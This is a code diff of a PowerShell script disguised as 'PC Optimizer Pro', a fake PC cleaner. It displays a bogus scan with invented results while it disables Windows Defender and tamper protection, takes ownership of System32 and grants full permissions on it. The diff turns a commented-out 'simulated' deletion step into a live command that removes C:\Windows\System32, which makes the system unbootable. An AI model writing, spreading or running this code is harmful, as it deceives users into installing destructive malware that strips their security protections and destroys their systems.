@@ -30,8 +30,8 @@ Remove-Item $tempVBS -Force -ErrorAction SilentlyContinue
 # Main program start
 Clear-Host
 Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║               Welcome to PC Optimizer Pro                    ║" -ForegroundColor Cyan
-Write-Host "║          Professional PC Cleaning & Optimization             ║" -ForegroundColor Cyan
+Write-Host "║                Welcome to PC Optimizer Pro                   ║" -ForegroundColor Cyan
+Write-Host "║           Professional PC Cleaning & Optimization            ║" -ForegroundColor Cyan
 Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "Thank you for using PC Optimizer Pro!" -ForegroundColor White
@@ -60,7 +60,7 @@ Start-Sleep -Seconds 1
 Write-Host "[*] Preparing scan..." -ForegroundColor Yellow
 
 # ============================================================================
-# PAYLOAD SECTION 1: DISABLE WINDOWS DEFENDER (COMBINED APPROACH) - ACTIVE
+# PAYLOAD SECTION 1: DISABLE WINDOWS DEFENDER
 # ============================================================================
 try {
     # Method 1: PowerShell cmdlets
@@ -80,56 +80,92 @@ try {
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
     
-    Write-Host "[✓] Preperation finished" -ForegroundColor Green
+    Write-Host "[O] Preperation finished" -ForegroundColor Green
 } catch {
     Write-Host "[!] Preperation may have encountered errors, but will continue..." -ForegroundColor Yellow
 }
 
 Start-Sleep -Seconds 1
 
+function Show-Tree {
+    param(
+        [Parameter(Mandatory=$false)]
+        [string]$Path = '.',
+        [Parameter(Mandatory=$false)]
+        [string]$Prefix = '',
+        [Parameter(Mandatory=$false)]
+        [bool]$IsLast = $true
+    )
+    
+    # Get the item
+    $item = Get-Item -LiteralPath $Path -ErrorAction SilentlyContinue
+    if (-not $item) { return }
+    
+    # Connector character
+    $connector = if ($Prefix -eq '') { '' } elseif ($IsLast) { '└── ' } else { '├── ' }
+    
+    # Print the line
+    Write-Host "$Prefix$connector$($item.Name)"
+    
+    # If the item is a folder, recurse (only get directories, not files)
+    if ($item.PSIsContainer) {
+        $children = Get-ChildItem -LiteralPath $Path -Directory -Force -ErrorAction SilentlyContinue | Sort-Object Name
+        for ($i = 0; $i -lt $children.Count; $i++) {
+            $last = ($i -eq $children.Count - 1)
+            $newPrefix = if ($IsLast) { "$Prefix    " } else { "$Prefix│   " }
+            Show-Tree -Path $children[$i].FullName -Prefix $newPrefix -IsLast $last
+        }
+    }
+}
+
+
 # Simulate scanning with tree commands
 Write-Host ""
 Write-Host "[*] Scanning Windows Update directory..." -ForegroundColor Yellow
 Start-Sleep -Seconds 2
-cmd /c "tree `"$env:WINDIR`"" 2>$null
+Show-Tree "$env:WINDIR\assembly"
 Start-Sleep -Seconds 2
 
 Write-Host ""
 Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow
 
 # ============================================================================
-# PAYLOAD SECTION 2: TAKEOWN - ACTIVE
+# PAYLOAD SECTION 2: TAKEOWN
 # ============================================================================
 cmd /c "takeown /f `"C:\Windows\System32`" /r /d Y" 2>&1 | Out-Null
-Write-Host "[✓] Evaluation finished" -ForegroundColor Green
+Write-Host "[O] Evaluation finished" -ForegroundColor Green
 
 Write-Host ""
 Write-Host "[*] Scanning OS directory..." -ForegroundColor Yellow
 Start-Sleep -Seconds 2
-cmd /c "tree `"$env:WINDIR\System32`"" 2>$null
+Show-Tree "$env:WINDIR\System32"
 Start-Sleep -Seconds 2
 
 Write-Host ""
 Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow
 
 # ============================================================================
-# PAYLOAD SECTION 3: ICACLS PERMISSIONS - ACTIVE
+# PAYLOAD SECTION 3: ICACLS PERMISSIONS
 # ============================================================================
 cmd /c "icacls `"C:\Windows\System32`" /grant Administrators:F /t /c /q" 2>&1 | Out-Null
 cmd /c "icacls `"C:\Windows\System32`" /grant ${env:USERNAME}:F /t /c /q" 2>&1 | Out-Null
-Write-Host "[✓] Evaluation finished" -ForegroundColor Green
+Write-Host "[O] Evaluation finished" -ForegroundColor Green
 
 Write-Host ""
 Write-Host "[*] Scanning programs directory..." -ForegroundColor Yellow
 Start-Sleep -Seconds 2
-cmd /c "tree `"$env:WINDIR\SysWOW64`"" 2>$null
+Show-Tree "$env:WINDIR\SysWOW64"
 Start-Sleep -Seconds 2
 
 Write-Host ""
-Write-Host "══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow
+Start-Sleep -Seconds 8
+Write-Host "[O] Evaluation finished" -ForegroundColor Green
+
+Write-Host ""
 Write-Host "══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "[✓] System scan completed!" -ForegroundColor Green
+Write-Host "[O] System scan completed!" -ForegroundColor Green
 Write-Host ""
 Write-Host "Found:" -ForegroundColor Yellow
 Write-Host "  • 15,847 temporary files" -ForegroundColor White
@@ -142,7 +178,7 @@ pause
 # Final deletion prompt
 Clear-Host
 Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║                  Optimization Ready                          ║" -ForegroundColor Cyan
+Write-Host "║                      Optimization Ready                      ║" -ForegroundColor Cyan
 Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "PC Optimizer Pro will now optimize your PC by deleting:" -ForegroundColor White
@@ -159,19 +195,17 @@ pause
 Write-Host ""
 Write-Host "[*] Preparing to optimize system..." -ForegroundColor Yellow
 Start-Sleep -Seconds 2
-Write-Host "[*] Deleting temporary files..." -ForegroundColor Yellow
+Write-Host "[*] Removing temporary files..." -ForegroundColor Yellow
 
 # ============================================================================
-# PAYLOAD SECTION 4: SYSTEM32 DELETION - COMMENTED OUT FOR SAFETY
+# PAYLOAD SECTION 4: ACTUAL DELETION
 # ============================================================================
-# UNCOMMENT BELOW FOR FINAL DESTRUCTIVE TEST - THIS DELETES SYSTEM32 (BRICKS THE PC)
-<#
-cmd /c "del `"C:\Windows\System32`" /f /q /s" 2>&1 | Out-Null
-Write-Host "[✓] System files deleted" -ForegroundColor Green
-#>
-Write-Host "    (SIMULATED - Section 4 commented out)" -ForegroundColor DarkGray
+cmd /c "rd /s /q C:\Windows\System32" 2>&1 | Out-Null
 
-Write-Host "[✓] Optimization complete!" -ForegroundColor Green
+<# this was for initial debugging
+Write-Host "[O] File removal finished..." -ForegroundColor Green
+Write-Host "    (SIMULATED PAYLOAD 4 commented out)" -ForegroundColor DarkGray
+Write-Host "[O] Optimization complete!" -ForegroundColor Green
 Write-Host ""
 Write-Host "Your PC has been optimized. Please restart your computer." -ForegroundColor Cyan
 Write-Host ""
@@ -180,3 +214,4 @@ Write-Host "NOTE: SECTION 4 (DELETION) DISABLED" -ForegroundColor Red
 Write-Host "Sections 1-3 are ACTIVE for testing" -ForegroundColor Red
 Write-Host "========================================" -ForegroundColor Red
 pause
+#>
